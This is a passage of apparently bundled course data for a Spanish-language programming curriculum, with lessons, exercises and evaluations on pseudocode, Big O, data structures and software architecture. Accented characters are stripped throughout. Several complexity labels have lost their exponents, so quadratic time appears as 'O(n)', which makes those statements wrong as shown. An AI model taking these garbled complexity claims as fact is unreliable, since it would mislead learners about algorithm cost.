## 4. El "Debugger de Pato de Goma"
Existe una tcnica real llamada *Rubber Duck Debugging*. Consiste en poner un patito de goma (o cualquier objeto) sobre tu mesa y explicarle tu cdigo lnea por lnea.
Cuando intentas explicarle a otro qu hace tu cdigo, tu cerebro a menudo se da cuenta solo del error: *"Ah, espera... aqu estoy sumando peras con manzanas"*.

---

### Ejercicio Mental 10:
Imagina este cdigo de pseudocdigo:
\`\`\`text
Variable saldo = 100
Variable gasto = 150

SI (saldo < gasto) ENTONCES:
    Mostrar: "Compra realizada con xito"
SINO:
    Mostrar: "Saldo insuficiente"
FIN SI
\`\`\`
Ves el error? Si tengo 100 de saldo y gasto 150, qu mensaje me va a mostrar el programa? Cmo cambiaras la condicin del \`SI\` para que sea lgica?
`,completed:!1},{id:"prog-bases-11-buenas-practicas",title:"Buenas Prcticas Mentales",level:"junior",content:`# Leccin 11: Buenas Prcticas Mentales

Programar bien no es una cuestin de astucia, sino de hbitos. Como esta es la ltima leccin de las bases, vamos a ver qu separa a un buen programador de uno mediocre.

## 1. El cdigo se lee ms de lo que se escribe
Pasars mucho tiempo leyendo cdigo que escribiste hace meses o cdigo escrito por otros. 
*   **S claro:** Usa nombres de variables que expliquen qu hacen.
*   **Comenta tu cdigo:** Deja pequeas notas para tu "yo del futuro". 

\`\`\`text
// Este bloque calcula el descuento del 10% para jubilados
Variable descuento = total * 0.10
\`\`\`

## 2. El principio KISS (Keep It Simple, Stupid)
En programacin, lo ms complejo no es lo mejor. **Lo ms simple es lo mejor.** 
Si puedes resolver un problema en 3 pasos, no uses 10. El cdigo simple es ms fcil de arreglar y de entender.

## 3. No le tengas miedo a fallar
En esta carrera, vers errores todos los das. Un error no significa que "no sirves para esto", significa que ests aprendiendo algo nuevo. Cada vez que arreglas un bug, tu cerebro gana una herramienta nueva.

## 4. Documenta tu pensamiento
Antes de escribir una sola lnea de cdigo real, haz un boceto en papel o en pseudocdigo. Entender la lgica primero te ahorrar horas de sudor frente al teclado.

## 5. El aprendizaje nunca termina
La tecnologa cambia rpido. Pero las bases que aprendiste en este mdulo (algoritmos, lgica, variables, condicionales) **son universales**. No importa si maana sale el lenguaje "SuperJS 5000", las bases seguirn siendo las mismas.

---

### Tu primer gran paso
Felicitaciones! Has completado el mdulo de Bases de la Programacin. Aunque no hemos escrito cdigo "de verdad" todava, ya tienes lo ms importante: **la mentalidad de programador**.

Ahora ests listo para enfrentar desafos prcticos y empezar a hablarle a las mquinas. A romperla! 
`,completed:!1,isProject:!0},{id:"prog-bases-12-practica-logica-junior",title:"Lgica de Programacin Junior",level:"junior",content:`# Prctica: Lgica de Programacin Junior

Esta gua de ejercicios te ayudar a fortalecer tu msculo lgico. Recuerda: No estamos escribiendo cdigo para una mquina todava, estamos escribiendo instrucciones para que cualquier humano pueda seguirlas sin perderse.

---

## 1. Algoritmos de la Vida Cotidiana
Un algoritmo debe ser a prueba de fallos. Intenta describir los pasos para estas situaciones, considerando los posibles obstculos:

### Caso A: El Mate / T Perfecto
**Contexto:** Debes explicarle a un extraterrestre cmo preparar tu infusin favorita.
**Consigna:**
*   Nombra todos los elementos necesarios (Entradas).
*   Escribe al menos 10 pasos ordenados.
*   Incluye qu hacer si el agua est demasiado fra (Condicional).

### Caso B: Compras Online
**Contexto:** Ests diseando los pasos para comprar una remera en una web.
**Consigna:**
*   Escribe el flujo desde que el usuario ve la remera hasta que recibe el mensaje de "Compra Exitosa".
*   Qu pasa si no hay stock del talle elegido?

---

## 2. Diagramas de Flujo (Lgica Visual)
Aunque no los dibujemos, los diagramas de flujo representan los caminos que toma un programa. Describe el flujo lgico para estos sistemas inteligentes:

### El Sensor de Luz de un Jardn
**Consigna:** Describe qu camino sigue el programa considerando los siguientes elementos:
1.  **Inicio**
2.  **Entrada:** Nivel de luz solar (0 a 100).
3.  **Decisin:** El nivel de luz es menor a 20?
4.  **Accin A:** Prender luces.
5.  **Accin B:** Apagar luces.
6.  **Espera:** Esperar 10 minutos y volver a empezar.

---

## 3. Resolucin de Problemas Lgicos
Pon a prueba tu pensamiento lateral y tu capacidad de anlisis:

### El Desafo del Ascensor
**Contexto:** Un edificio tiene 10 pisos. El ascensor est en el piso 1. Dos personas llaman al mismo tiempo: una desde el piso 5 (quiere bajar) y otra desde el piso 9 (quiere bajar).
**Consigna:**
*   A quin debera buscar primero el ascensor para ser ms eficiente? Justifica tu respuesta paso a paso.
*   Si el ascensor solo puede llevar a una persona, cmo cambia tu algoritmo?

### Las Tres Lmparas
**Contexto:** Tienes una habitacin cerrada con 3 lmparas adentro. Afuera hay 3 interruptores. Solo puedes entrar a la habitacin UNA VEZ.
**Consigna:** Cmo puedes saber qu interruptor corresponde a qu lmpara? (Pista: Piensa en otra salida adems de la luz, como el calor). Describe tu proceso lgico paso a paso.

---

## 4. Pensamiento Estructurado (Entrada -> Proceso -> Salida)
Completa el siguiente cuadro lgico para estos sistemas:

| Sistema | Entradas | Proceso (Lgica simple) | Salida |
| :--- | :--- | :--- | :--- |
| **Lavarropas** | Ropa sucia, Jabn, Programa | SI Algodn -> Lavar 40 min... | Ropa Limpia |
| **Cajero Automtico** | ? | ? | ? |
| **Buscador de Google** | ? | ? | ? |
| **Alarma de Celular** | ? | ? | ? |

---

## 5. El Desafo del Robot "Bartender"
**Contexto:** Un robot debe servir jugo de naranja.
**Pseudocdigo a completar:**
\`\`\`text
1. Agarrar un vaso.
2. SI (vaso tiene suciedad) ENTONCES:
      _________________________
   SINO:
      _________________________
3. MIENTRAS (vaso no est lleno al 90%) HACER:
      _________________________
4. Mostrar: "Jugo listo, que lo disfrutes".
\`\`\`
**Consigna:** Completa los espacios en blanco para que el robot funcione correctamente y no ensucie la cocina.

---

Felicitaciones! Si completaste estos ejercicios, ests pensando como un verdadero arquitecto de soluciones. La sintaxis de los lenguajes de programacin es solo el envoltorio; esto que acabas de practicar es el verdadero regalo.     
`,completed:!1,isProject:!0},{id:"prog-bases-13-pensamiento-algoritmico",title:"Pensamiento Algortmico y Complejidad Bsica",level:"semi-senior",content:`# Leccin 13: Pensamiento Algortmico y Complejidad Bsica

Como programador Semi-Senior, ya sabes que "hacer que funcione" es solo el primer paso. El verdadero desafo es **hacer que funcione de manera ptima**.

## 1. Ms all del cdigo: El Pensamiento Algortmico
El pensamiento algortmico es la capacidad de definir procesos que no solo resuelven un problema, sino que lo hacen considerando los recursos disponibles (tiempo y memoria).

### Ejemplo: Buscar un nombre en una agenda fsica
1.  **Enfoque Lineal:** Empiezas en la pgina 1 y pasas hoja por hoja hasta encontrarlo. Si la agenda tiene 1000 hojas, podras tardar 1000 pasos.
2.  **Enfoque Binario:** Abres la agenda a la mitad. El nombre est antes o despus? Descartas 500 hojas de un golpe. Repites. En 10 pasos habrs encontrado el nombre entre 1000.

## 2. Introduccin a la Complejidad (Big O)
No necesitas ser un experto en matemticas, pero s entender el concepto de **Orden de Crecimiento**.

*   **O(1) - Tiempo Constante:** No importa si tienes 1 dato o 1 milln, tarda lo mismo (ej: acceder a un dato por su ID).
*   **O(n) - Tiempo Lineal:** Si los datos se duplican, el tiempo de ejecucin se duplica (ej: un bucle simple).
*   **O(n) - Tiempo Cuadrtico:** Si los datos se duplican, el tiempo se cuadriplica (ej: bucles anidados). **Peligro en produccin!**

## 3. Resolucin de Problemas: La Estrategia del Semi-Senior
Cuando te dan un problema complejo, un Junior empieza a escribir cdigo inmediatamente. Un Semi-Senior:
1.  **Analiza los lmites:** Cuntos datos vamos a procesar? 100 o 10 millones?
2.  **Busca el cuello de botella:** Qu parte del algoritmo es la ms lenta?
3.  **Evala Trade-offs:** Prefiero que el programa sea ms rpido aunque gaste ms memoria?

---

### Ejercicio de Razonamiento 13:
Tienes una lista de 10.000 nmeros desordenados y necesitas saber si hay duplicados.
*   **Plan A:** Comparar cada nmero con todos los dems usando dos bucles anidados.
*   **Plan B:** Ordenar primero la lista y luego comparar cada nmero solo con el siguiente.
*   **Plan C:** Usar una estructura que no permita duplicados (como un Set) y ver si el tamao final cambia.

Cul es el ms eficiente y por qu? Justifica tu respuesta pensando en el impacto si la lista creciera a 1.000.000 de nmeros.
`,completed:!1},{id:"prog-bases-14-abstraccion-descomposicion",title:"Abstraccin y Descomposicin de Problemas Reales",level:"semi-senior",content:`# Leccin 14: Abstraccin y Descomposicin de Problemas Reales

A este nivel, los problemas dejan de ser "suma estos nmeros" para convertirse en "disea un sistema de facturacin". La clave para no morir en el intento son la **Abstraccin** y la **Descomposicin**.

## 1. Abstraccin Avanzada
Abstraer no es solo omitir detalles; es crear **modelos mentales** que representen la esencia de un problema.

**Caso de estudio: Sistema de Logstica**
Si ests programando el seguimiento de paquetes:
*   **Detalles irrelevantes:** El color del camin, el nombre del conductor del da, el clima (generalmente).
*   **Abstraccin necesaria:** Estado del paquete (\`En camino\`, \`Entregado\`), Coordenadas de origen/destino, Tiempo estimado.

## 2. Descomposicin: El Arte de Desarmar
Un problema complejo es solo una montaa de problemas pequeos. El secreto es separarlos de forma que sean independientes (Bajo Acoplamiento).

### Metodologa:
1.  **Identificar el Flujo Principal:** Cul es el camino feliz?
2.  **Identificar los Casos de Error:** Qu puede fallar en cada paso?
3.  **Encapsular:** Crear pequeas funciones o mdulos que resuelvan una sola sub-tarea.

## 3. Resolucin de un Problema Real: El "Checkout" de E-commerce
No pienses en cdigo, piensa en procesos:
*   **Sub-problema 1:** Validar stock de cada item.
*   **Sub-problema 2:** Calcular impuestos segn la regin.
*   **Sub-problema 3:** Aplicar cupones de descuento.
*   **Sub-problema 4:** Integrar con la pasarela de pagos.

Si intentas programar todo esto en un solo bloque, crears un "cdigo espagueti" imposible de mantener.

---

### Ejercicio de Razonamiento 14:
Imagina que te piden crear un sistema para una **Biblioteca Municipal**. 
1.  **Aplica Abstraccin:** Qu 5 datos son vitales para el objeto \`Libro\`?
2.  **Aplica Descomposicin:** Una persona quiere devolver un libro que entreg con retraso. Enumera los 4 pasos (sub-problemas) que el sistema debe ejecutar.
3.  **Compara enfoques:** Es mejor tener una sola gran funcin \`procesar_todo()\` o sub-funciones como \`calcular_multa()\` y \`actualizar_stock()\`? Por qu?
`,completed:!1},{id:"prog-bases-15-patrones-estructuras",title:"Patrones Mentales y Estructuras de Datos",level:"semi-senior",content:`# Leccin 15: Patrones Mentales y Estructuras de Datos

Tu cerebro debe empezar a reconocer estructuras de datos no como "teora", sino como herramientas especficas para problemas recurrentes.

## 1. Patrones Mentales: El "Cmo lo guardo?"
Cada vez que recibes datos, tu primera pregunta debe ser: **Cmo voy a acceder a esta informacin despus?**

*   **Si necesito orden y acceso por posicin:** Uso un **Array** (Lista).
*   **Si necesito buscar algo por una clave nica rpidamente:** Uso un **Mapa** (Diccionario/Objeto).
*   **Si necesito asegurar que no haya repetidos:** Uso un **Set** (Conjunto).
*   **Si necesito procesar cosas en orden de llegada:** Uso una **Cola** (Queue - FIFO).
*   **Si necesito deshacer la ltima accin:** Uso una **Pila** (Stack - LIFO).

## 2. Estructuras de Datos en Accin
Mira cmo el cambio de estructura cambia la lgica:

### Problema: Sistema de Notificaciones de una App
*   **Opcin A (Array):** Guardas las notificaciones en una lista. Para borrar la ms vieja, tienes que mover todos los elementos de lugar. Lento.
*   **Opcin B (Cola):** La estructura est diseada para que el primero que entra sea el primero que sale. Eficiente y coherente.

## 3. El hbito del Semi-Senior: Evitar la "Fuerza Bruta"
La fuerza bruta es usar un bucle dentro de otro para buscar coincidencias. 
**Truco de Oro:** Muchas veces, puedes cambiar un algoritmo O(n) por uno O(n) simplemente usando un **Mapa** temporal para recordar lo que ya viste.

---

### Ejercicio de Razonamiento 15:
Ests programando el botn "Atrs" de un navegador web. El usuario visita:
\`Google -> Facebook -> Instagram -> Wikipedia\`.
1.  Qu estructura de datos (Pila o Cola) usaras para guardar este historial de forma que el botn "Atrs" funcione correctamente?
2.  Dibuja el estado de esa estructura en cada paso.
3.  Qu pasara si usaras la estructura incorrecta? Describe el error que vera el usuario.
`,completed:!1},{id:"prog-bases-16-pensamiento-sistemico",title:"Anlisis de Problemas Complejos y Pensamiento Sistmico",level:"senior",content:`# Leccin 16: Anlisis de Problemas Complejos y Pensamiento Sistmico

En el nivel Senior, ya no resolvemos "tickets"; resolvemos **problemas de negocio** mediante sistemas tcnicos. La diferencia radica en entender que el software no vive en el vaco, sino en un ecosistema interconectado.

## 1. El Pensamiento Sistmico
Un sistema es ms que la suma de sus partes. El pensamiento sistmico nos obliga a ver:
*   **Interdependencias:** Cmo afecta mi cambio en el mdulo A a la latitud del mdulo C?
*   **Bucles de Retroalimentacin:** Cmo reaccionar el sistema bajo carga si introduzco este nuevo algoritmo?
*   **Resultados Emergentes:** Comportamientos que no estaban en los componentes individuales pero aparecen al unirlos.

## 2. Anlisis de Problemas mediante "Primeros Principios"
Un Arquitecto no acepta "siempre se hizo as". Usamos el mtodo de Primeros Principios:
1.  **Desglosar** el problema hasta sus verdades fundamentales.
2.  **Reconstruir** la solucin desde cero sin prejuicios tecnolgicos.

**Caso Real: El Sistema de Notificaciones que "tilda" la App**
*   *Problema superficial:* La base de datos est lenta.
*   *Anlisis sistmico:* El sistema de notificaciones enva 1 milln de push al mismo tiempo. Todos los usuarios abren la app simultneamente. El pico de trfico satura la DB. 
*   *Solucin Senior:* No escalamos la DB; implementamos un **Staggered Push** (envo escalonado) o un sistema de colas con **Load Leveling**.

## 3. Identificacin de la "Causa Raz" (5 Whys)
No tratamos sntomas, tratamos enfermedades. Preguntamos "Por qu" hasta llegar al problema de diseo fundamental.

---

### Desafo de Pensamiento Senior 16:
Ests diseando el sistema de inventario para una cadena global de tiendas. 
*   **Dato:** La sincronizacin de stock es crtica, pero la conexin a internet en algunas tiendas es inestable.
*   **Problema:** Si usas una base de datos central, las tiendas sin internet no pueden vender. Si usas bases locales, el stock global est desactualizado.
*   **Misin:** Aplica el pensamiento sistmico. Cmo balancearas la **Consistencia** (stock exacto) vs la **Disponibilidad** (poder vender siempre)? Qu pasa si dos tiendas venden el ltimo producto al mismo tiempo?
`,completed:!1},{id:"prog-bases-17-diseno-algoritmos-avanzados",title:"Diseo de Algoritmos y Optimizacin Mental",level:"senior",content:`# Leccin 17: Diseo de Algoritmos y Optimizacin Mental

A este nivel, la optimizacin no es solo "hacerlo rpido", sino entender los lmites fsicos y lgicos de la solucin elegida.

## 1. Diseo de Algoritmos a Escala
Un algoritmo que funciona para 1,000 usuarios puede ser catastrfico para 100,000,000. El Arquitecto Senior disea con la **escalabilidad horizontal** en mente.

*   **Statelessness (Sin estado):** El algoritmo no debe depender de memoria local voltil si queremos que corra en mltiples servidores.
*   **Idempotencia:** Si el algoritmo se ejecuta dos veces por error, el resultado debe ser el mismo (vital en sistemas distribuidos).

## 2. Optimizacin Mental y Estructuras de Datos Especializadas
Ms all de Arrays y Mapas, un Senior conoce:
*   **Bloom Filters:** Para saber si un elemento existe en un set gigante con gasto mnimo de memoria.
*   **HyperLogLog:** Para contar elementos nicos en flujos de datos masivos.
*   **Geohashes:** Para bsquedas espaciales eficientes.

## 3. El Costo de la Abstraccin
Cada capa de abstraccin (frameworks, ORMs, libreras) tiene un costo de performance. El Senior sabe cundo "bajar de nivel" para optimizar un cuello de botella crtico, sin sacrificar la legibilidad del resto del sistema.

---

### Desafo de Pensamiento Senior 17:
Debes procesar un archivo de 50GB de logs buscando patrones de error, pero el servidor solo tiene 8GB de RAM.
1.  **Algoritmo Ineficiente:** Cargar todo el archivo en memoria y filtrar. (Crash inmediato).
2.  **Estrategia Senior:** Cmo dividiras el problema? (Pista: Streaming vs Buffering).
3.  **Optimizacin:** Si necesitas saber cuntos usuarios  NICOS tuvieron errores sin guardar todos sus IDs, qu estructura de datos mencionada arriba usaras para ahorrar el 99% de la RAM?
`,completed:!1},{id:"prog-bases-18-tradeoffs-decisiones",title:"Trade-offs y Toma de Decisiones Arquitectnicas",level:"senior",content:`# Leccin 18: Trade-offs y Toma de Decisiones Arquitectnicas

En ingeniera de software **no hay soluciones perfectas, solo hay compromisos (trade-offs)**. Ser Senior es saber qu ests sacrificando en cada decisin.

## 1. El Marco de Decisin: Tiempo, Calidad, Costo
Toda decisin tcnica impacta en estas tres variables. 
*   Si eliges una tecnologa de vanguardia, ganas **Velocidad de desarrollo**, pero sacrificas **Estabilidad** y **Mantenimiento** a largo plazo (deuda tcnica).

## 2. Flexibilidad vs Rendimiento
Sistemas extremadamente flexibles suelen ser ms lentos debido a las capas de indireccin. Sistemas extremadamente optimizados suelen ser rgidos y difciles de cambiar.
*   **Senior Tip:** Optimiza prematuramente y te arrepentirs. Disea para el cambio, pero identifica el 20% del cdigo que maneja el 80% del trfico y optimiza *solo eso* agresivamente.

## 3. Comprar vs Construir (Build vs Buy)
Debemos programar nuestro propio sistema de auth o usar Auth0?
*   **Build:** Control total, sin costos recurrentes, pero requiere tiempo y mantenimiento eterno.
*   **Buy:** Rpido, seguro, pero genera dependencia del proveedor (Vendor Lock-in) y costos de escala.

---

### Desafo de Pensamiento Senior 18:
Tu startup est creciendo. El sistema monoltico actual es fcil de desplegar pero difcil de escalar para el equipo de 50 programadores.
1.  **Opcin A:** Migrar a Microservicios. (Alta complejidad, latitud de red, necesidad de DevOps).
2.  **Opcin B:** Modularizar el Monolito (Monolito Modular). (Ms simple, pero sigue compartiendo la misma base de datos, lo que puede ser un cuello de botella).

Qu criterios usaras para decidir? Nombra 3 factores de negocio que te haran elegir la Opcin A sobre la B.
`,completed:!1},{id:"prog-bases-19-errores-diseno-deuda",title:"Errores de Diseo y Deuda Tcnica",level:"senior",content:`# Leccin 19: Errores de Diseo y Deuda Tcnica

El cdigo que escribimos hoy es el legado que mantendremos maana. Un Senior entiende que la deuda tcnica es una herramienta financiera: a veces es til para salir rpido, pero si no se paga, los intereses matan el proyecto.

## 1. Patrones vs Antipatrones
Un antipatrn es una solucin que parece buena pero tiene consecuencias desastrosas:
*   **The God Object:** Una sola clase/funcin que lo sabe y hace todo. Violacin total del principio de Responsabilidad  nica.
*   **Big Ball of Mud:** Falta total de arquitectura, donde el cdigo est entrelazado de forma impredecible.
*   **Golden Hammer:** Usar la misma tecnologa para todo (ej: usar una base de datos de grafos para guardar una simple lista de tareas).

## 2. Cmo manejar la Deuda Tcnica
*   **Visibilidad:** Mapear los puntos del sistema que son "dolorosos" de modificar.
*   **Refactorizacin Continua:** El Boy Scout Rule (deja el cdigo un poco mejor de como lo encontraste).
*   **Estrategia de Estrangulamiento (Strangler Pattern):** Para sistemas legacy, ir reemplazando piezas poco a poco en lugar de intentar un "re-write" total que suele fallar.

## 3. El sesgo de la "Solucin Elegante"
A veces los Seniors nos perdemos en abstracciones excesivamente complejas para problemas simples. 
**Regla Senior:** La elegancia real de un diseo se mide por lo fcil que es para un Junior entenderlo sin supervisin.

---

### Desafo de Pensamiento Senior 19:
Heredas un proyecto donde cambiar el color de un botn requiere tocar 5 archivos diferentes y rezar para que no se rompa el reporte de ventas.
1.  Identifica qu tipo de problema arquitectnico es este (Acoplamiento? Falta de abstraccin?).
2.  Propn un plan de 3 fases para arreglarlo sin detener las nuevas funcionalidades que pide el negocio.
3.  Cmo convenceras al Product Manager de que invertir tiempo en este "mantenimiento invisible" es mejor que sacar 2 features nuevas?
`,completed:!1},{id:"prog-bases-20-evaluacion-liderazgo",title:"Evaluacin de Soluciones y Roadmap Tecnolgico",level:"senior",content:`# Leccin 20: Evaluacin de Soluciones y Roadmap Tecnolgico

La ltima etapa del pensamiento de un Arquitecto es la capacidad de mirar al futuro y evaluar si la tecnologa que elegimos hoy seguir siendo vlida en 3 aos.

## 1. Benchmarking y POCs (Pruebas de Concepto)
No elegimos tecnologas por "hype". Hacemos pruebas reales:
*   **Latencia:** Cunto tarda realmente en procesar bajo stress?
*   **Curva de aprendizaje:** Cunto tardar el equipo en ser productivo?
*   **Comunidad y Soporte:** Morir esta librera en 6 meses?

## 2. El Ciclo de Vida del Software
Un Senior sabe que el software tiene etapas:
1.  **Exploracin (MVP):** Primamos velocidad.
2.  **Crecimiento:** Primamos estabilidad y escalabilidad.
3.  **Madurez:** Primamos mantenimiento y costo operativo.

## 3. Liderazgo Tcnico
Ser Senior implica mentora. Tu objetivo final es que el sistema sea capaz de sobrevivir sin ti. El cdigo debe estar documentado no solo en el "qu" hace, sino en el **"por qu"** de las decisiones tomadas (ADRs - Architecture Decision Records).

---

### Desafo Final Senior 20:
Has llegado al final de las bases. Tu ltima tarea no es programar, es **evaluar**.
Ests frente a dos propuestas para una nueva API:
*   **Propuesta A:** Arquitectura de microservicios usando Rust, con bases de datos distribuidas y comunicacin via gRPC. (Altsima performance, muy compleja, difcil de contratar gente).
*   **Propuesta B:** Aplicacin monoltica en Node.js, base de datos Postgres clsica y REST. (Performance suficiente, desarrollo rpido, fcil de encontrar programadores).

Si la empresa es una startup con 3 meses de pista (dinero) restante, cul eliges y por qu? Y si la empresa es Google buscando optimizar procesos de bsqueda? Justifica tu rol como Arquitecto.
`,completed:!1,isProject:!0},{id:"prog-bases-ejercicios-junior",title:"Bases de la Programacin (Junior)",level:"junior",content:`# Ejercicios: Bases de la Programacin (Junior)

Es hora de poner a prueba tu lgica! Recuerda que aqu no importa la sintaxis de un lenguaje, sino cmo piensas el problema.

---

## 1. El Algoritmo de la Llamada Perdida
**Contexto:** Quieres llamar a tu mam por telfono.
**Consigna:** Escribe un algoritmo de 7 pasos usando las bases que vimos. S preciso.
1. [Inicio]
2. ...
3. ...
4. ...
5. ...
6. ...
7. [Fin]

---

## 2. Detective de Variables
**Contexto:** Ests diseando un sistema para una veterinaria.
**Consigna:** Nombra la variable y elige el tipo de dato correcto (Nmero, Texto o Booleano) para:
*   El nombre del perro.
*   El peso del perro.
*   Si el perro tiene sus vacunas al da.
*   Cuntas veces comi hoy.

---

## 3. El Semforo Lgico
**Contexto:** Ests programando un semforo inteligente.
**Consigna:** Escribe en pseudocdigo la lgica de decisin usando SI... SINO.
*   Si el color es "Rojo", mostrar "Detenerse".
*   Si el color es "Amarillo", mostrar "Precaucin".
*   Si el color es "Verde", mostrar "Avanzar".

---

## 4. El Repetidor de Tareas
**Contexto:** Un profesor te castig y debes escribir 100 veces "No debo hablar en clase".
**Consigna:** Escribe un bucle (PARA o MIENTRAS) que haga esto por ti. No olvides que necesitas una variable contador.

---

## 5. El Traductor de Funciones
**Contexto:** Necesitas una funcin que nos diga si una persona es "Anciano" (ms de 65 aos).
**Consigna:**
1. Define la funcin \`EsAnciano\`.
2. Qu **parmetro** recibe?
3. Escribe la lgica interna (el SI).
4. Qu **retorna**? (Verdadero o Falso?).

---

No te rindas! Si alguno te cuesta, vuelve a leer la leccin correspondiente. La lgica es un msculo que se entrena.    
`,completed:!1,isProject:!0},{id:"prog-bases-ejercicios-semi-senior",title:"Pensamiento Algortmico Semi-Senior",level:"semi-senior",content:`# Ejercicios: Pensamiento Algortmico Semi-Senior

Desafa tu capacidad de anlisis. Aqu no cuenta el cdigo, cuenta la **estrategia**.

---

## 1. El Cruce del Ro (Optimizacin de Recursos)
**Contexto:** Un granjero debe cruzar un ro con un lobo, una cabra y una col. Solo tiene un bote donde cabe l y una cosa ms. 
*   Si el lobo se queda solo con la cabra, se la come.
*   Si la cabra se queda sola con la col, se la come.

**Consigna:**
*   Escribe el algoritmo para cruzar a todos a salvo.
*   Cuntos viajes (ida y vuelta) son necesarios en total?
*   Este es un problema de **estados**. Qu estructura usaras para representar qu hay en cada orilla?

---

## 2. El Buscador Ineficiente
**Contexto:** Tienes un array de 1.000.000 de IDs de usuarios ordenados de menor a mayor. Necesitas encontrar si el ID \`987.654\` existe.
Un programador Junior hace un bucle \`for\` desde 0 hasta el final.

**Consigna:**
*   Explica por qu el enfoque del Junior es malo en este caso especfico.
*   Propn un algoritmo mejor (puedes describirlo en pasos).
*   Cuntas comparaciones como mximo realizara tu algoritmo vs el del Junior?

---

## 3. El Validador de Parntesis (Uso de Stack)
**Contexto:** Un compilador debe revisar si un cdigo tiene los parntesis bien cerrados. Ejemplo: \`( ( ) [ ] )\` est bien, pero \`( [ ) ]\` est mal.

**Consigna:**
*   Por qu un simple contador de "parntesis abiertos vs cerrados" no sirve para detectar el error en \`( [ ) ]\`?
*   Explica cmo usaras una **Pila (Stack)** para resolver este problema de forma infalible.

---

## 4. Prioridad en la Guardia Mdica
**Contexto:** En un hospital, los pacientes no se atienden por orden de llegada, sino por gravedad (Triage). 
*   Rojo: Emergencia (Atencin inmediata).
*   Amarillo: Urgente.
*   Verde: No urgente.

**Consigna:**
*   Disea el flujo de datos. Si llegan 3 pacientes "Verdes", luego 1 "Rojo" y luego 1 "Amarillo", en qu orden se atienden?
*   Qu estructura de datos permitira insertar a un paciente "Rojo" al principio de la fila de espera sin tener que mover a todos los dems?

---

A pensar! Un gran programador se nota en el papel antes que en la pantalla.      
`,completed:!1,isProject:!0},{id:"prog-bases-ejercicios-senior",title:"Ejercicios de Arquitectura: Bases de la Programacin (Senior)",level:"senior",content:`# Ejercicios de Arquitectura: Bases de la Programacin (Senior)

Bienvenido, Arquitecto. Estos desafos no se resuelven con sintaxis, sino con visin sistmica. No busques la "respuesta correcta", busca la "justificacin tcnica slida".

---

## 1. El Sistema de Votacin Global
**Contexto:** Debes disear un sistema para el mundial de ftbol donde 1.000 millones de personas votan al "Jugador del Partido" en los ltimos 5 minutos de juego.
**Desafo:**
*   La base de datos colapsar si intentas escribir cada voto en tiempo real.
*   El resultado debe mostrarse en pantalla gigante 30 segundos despus de terminar el partido.
**Consigna:**
1.  Describe una estrategia de **agregacin** de datos.
2.  Usaras una base de datos relacional para contar los votos? Por qu s o no?
3.  Cmo manejaras los votos duplicados desde un mismo celular?

---

## 2. Refactorizacin de un Sistema Legacy
**Contexto:** Trabajs en un banco. El sistema que calcula los intereses es un bloque de cdigo COBOL de hace 30 aos que nadie se atreve a tocar. Se quiere migrar a una tecnologa moderna.
**Desafo:** No pods apagar el banco ni un segundo.
**Consigna:**
1.  Explica cmo aplicaras el **Strangler Pattern** (Patrn de Estrangulamiento) para esta migracin.
2.  Cmo aseguraras que el nuevo sistema calcula EXACTAMENTE lo mismo que el viejo antes de activarlo definitivamente?

---

## 3. El Dilema del Mensaje que no se puede perder
**Contexto:** Un sistema mdico debe enviar alertas crticas de signos vitales desde un monitor a una central de enfermera.
**Desafo:** La red WiFi del hospital puede caerse.
**Consigna:**
1.  Qu pasara si uss un protocolo que no garantiza entrega (como UDP)?
2.  Propn una solucin de **re-intento (Retries)** y **almacenamiento temporal (Local Storage)**.
3.  Cmo detectara el sistema que un monitor se desconect totalmente?

---

## 4. Optimizacin de un Feed Social
**Contexto:** Un usuario con 10 millones de seguidores postea una foto.
**Desafo:** Si al postear debemos buscar a cada seguidor y poner la foto en su "muro", la base de datos se bloquea por horas (Write amplification).
**Consigna:**
1.  Compara la estrategia de **Push** (escribir en el muro de cada seguidor al postear) vs **Pull** (que el seguidor busque los posts de sus seguidos al abrir la app).
2.  Qu estrategia usaras para usuarios "normales" vs usuarios "celebridades"? (Solucin hbrida).

---

Excelente trabajo! Estos son los problemas que definen la carrera de un Senior.      
`,completed:!1,isProject:!0},{id:"prog-bases-evaluacion-junior",title:"Bases de la Programacin - Nivel Junior",level:"junior",content:`# Evaluacin Tcnica: Bases de la Programacin - Nivel Junior

Esta evaluacin mide la capacidad del estudiante para comprender la lgica fundamental, el flujo de datos y la estructuracin bsica de algoritmos sin depender de un lenguaje especfico.

---

## 1. Fundamentos Tericos (Conceptos)
Responde brevemente a las siguientes preguntas:
*   Cul es la diferencia entre un **Algoritmo** y un **Programa**?
*   Para qu sirve una **Variable** y por qu es importante elegir un buen nombre?
*   Explica con una analoga de la vida real qu es una **Funcin**.

## 2. Abstraccin y Flujo (Entrada, Proceso, Salida)
Completa la tabla lgica para un sistema de **"Compra de caf en mquina automtica"**:
*   **Entradas:** (Menciona al menos 3)
*   **Proceso:** (Resume el algoritmo en 3 pasos)
*   **Salida:** (Resultado final)

## 3. Lgica de Control (Interpretacin de Pseudocdigo)
Observa el siguiente bloque y responde qu mostrar la pantalla si la variable \`edad\` es igual a **18**:

\`\`\`text
Variable edad = 18
SI (edad > 18) ENTONCES:
    Mostrar: "Mayor de edad"
SINO SI (edad == 18) ENTONCES:
    Mostrar: "Tienes justo 18"
SINO:
    Mostrar: "Menor de edad"
FIN SI
\`\`\`
**Tu respuesta:** ________________________

## 4. Resolucin de Problemas: El Semforo Nocturno
**Contexto:** Un semforo debe cambiar a modo "Precaucin" (luz amarilla intermitente) solo si la hora es despus de las 00:00 y antes de las 06:00.
**Consigna:** Escribe el algoritmo lgico (en pasos o pseudocdigo) para este comportamiento.

## 5. Ejercicio Mental: Bucles
Imagina un contador que debe mostrar los nmeros del 10 al 1. Al llegar al 1, debe decir "Ignicin!".
Escribe los pasos necesarios usando una estructura de **Bucle**.

---

## Criterios de Aprobacin
*   **60% - Conocimiento Base:** Identifica correctamente tipos de datos y flujo de informacin.
*   **80% - Lgica Aplicada:** Resuelve el problema del semforo con condicionales coherentes.
*   **100% - Maestra Junior:** El algoritmo del bucle es exacto y no genera ciclos infinitos.

Mucho xito! Ests construyendo las bases de tu futuro.    
`,completed:!1,isProject:!0},{id:"prog-bases-evaluacion-semi-senior",title:"Bases de la Programacin - Nivel Semi-Senior",level:"semi-senior",content:`# Evaluacin Tcnica: Bases de la Programacin - Nivel Semi-Senior

Esta evaluacin se enfoca en la eficiencia algortmica, la eleccin de estructuras de datos y la capacidad de descomponer problemas complejos de software.

---

## 1. Anlisis de Complejidad (Big O)
Ordena las siguientes complejidades de la ms eficiente a la menos eficiente y pon un ejemplo de una operacin comn para cada una:
1.  **O(n)**
2.  **O(1)**
3.  **O(n)**

## 2. Estructuras de Datos y Decisiones
